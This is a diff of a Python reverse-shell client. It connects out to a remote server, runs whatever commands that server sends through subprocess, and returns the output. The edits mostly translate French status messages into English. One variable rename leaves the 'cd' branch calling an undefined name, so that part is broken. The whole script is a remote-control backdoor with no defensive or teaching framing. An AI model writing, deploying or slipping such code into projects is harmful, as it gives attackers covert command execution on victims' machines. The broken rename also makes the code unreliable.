@@ -10,10 +10,10 @@ bufsize = 4096
 client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 try:
     client.connect((ip, port))
-    print("connection reussite au serveur")
+    print("connection succefully to server")
 
 except:
-    print("echec de connection avec le serveur")
+    print("connection error to server")
 
 def send_message(client_socket, message):
     longueur_message = len(message.encode())
@@ -34,19 +34,19 @@ def receive_message(client_socket):
 
 while True:
     command = receive_message(client)
-    print("serveur send", command)
+    print("server send", command)
     if command == "":
         continue
 
 
     elif command.startswith("cd"):
-        repertoire = command.split(" ")[1]
+        folder = command.split(" ")[1]
         try:
             os.chdir(repertoire)
             msg = f"current path {os.getcwd()}"
             send_message(client, msg)
         except:
-            msg = f"le repertoire {repertoire} n'existe pas"
+            msg = f"folder {folder} not found"
             send_message(client, msg)
         continue
 
@@ -54,7 +54,7 @@ while True:
     else:
         output = subprocess.getoutput(command)
         len_output = len(output.encode())
-        print("taille du message", len_output, "octects")
+        print("size of message", len_output, "octects")
         if len_output == 0:
             len_output = 1
 
